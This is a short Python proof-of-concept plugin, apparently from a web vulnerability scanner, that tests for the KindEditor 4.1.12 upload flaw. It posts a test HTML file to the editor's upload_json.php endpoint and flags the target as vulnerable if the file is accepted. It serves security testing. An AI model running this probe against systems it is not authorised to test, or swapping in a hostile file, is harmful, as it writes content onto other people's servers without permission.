#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import json
from aiohttp import FormData
from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'kindeditor upload json'
        self.keyword = ['web', 'kindeditor', 'upload', 'json']
        self.info = 'Kindeditor <= 4.1.12 upload'
        self.type = 'upload'
        self.level = VUL_LEVEL.MEDIUM
        self.refer = 'https://github.com/kindsoft/kindeditor/issues/249'
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            async with ClientSession() as session:
                for path in self.url_normpath(self.url, './'):
                    url = path + "kindeditor/php/upload_json.php?dir=file"
                    data = FormData()
                    data.add_field('imgFile',
                                   "this is a test for you. ",
                                   filename='mytestforyou.html',
                                   content_type='text/plain')
                    async with session.post(url=url, data=data) as res:
                        if res!=None:
                            text = await res.text()
                            try:
                                res = json.loads(text)
                                if 'url'in res.keys() and 'kindeditor' in res['url']:
                                    self.flag = 1
                                    self.req.append({"url": url})
                                    self.res.append({"info": url, "key": url})
                            except:
                                pass